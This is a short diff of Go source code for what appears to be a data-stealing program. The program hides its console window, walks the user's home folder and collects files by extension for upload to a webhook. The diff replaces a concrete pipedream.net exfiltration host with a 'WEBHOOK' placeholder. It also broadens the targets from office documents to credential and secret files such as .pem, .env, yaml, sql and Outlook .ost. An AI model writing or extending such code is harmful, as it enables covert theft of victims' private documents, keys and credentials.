@@ -23,11 +23,13 @@ var (
 	swHide               = 0
 )
 
-var args = []string{"--upload", "--no-upload"} // Arguments
-var extensions = []string{"docx", "doc", "pdf", "xls", "png", "jpg", "txt"}
-var webhook = "en16qxhgreg7f.x.pipedream.net"
-var TESTING = false // flag for testing purposes
 var CurrentUsername string
+var args = []string{"--upload", "--no-upload"} // Arguments
+var extensions = []string{"docx", "doc", "pdf", "xls", "txt", "py", "xml", "json", ".pem", ".env", "php", "yaml", "yml", "csv", "sql", "ost", "ppt", "pptx", "pps"}
+
+var webhook = "WEBHOOK"
+
+var TESTING = false // flag for testing purposes
 
 func hideConsoleWindow() {
 	consoleWindow, _, _ := procGetConsoleWindow.Call()
@@ -303,7 +305,7 @@ func main() {
 	rootDirectory := "C:/Users/" + CurrentUsername
 
 	if TESTING == true {
-		rootDirectory = "C:/Users/Daniel/Desktop/stamfiles"
+		rootDirectory = ""
 	} else {
 		//Hides the CMD window
 		//hideConsoleWindow()
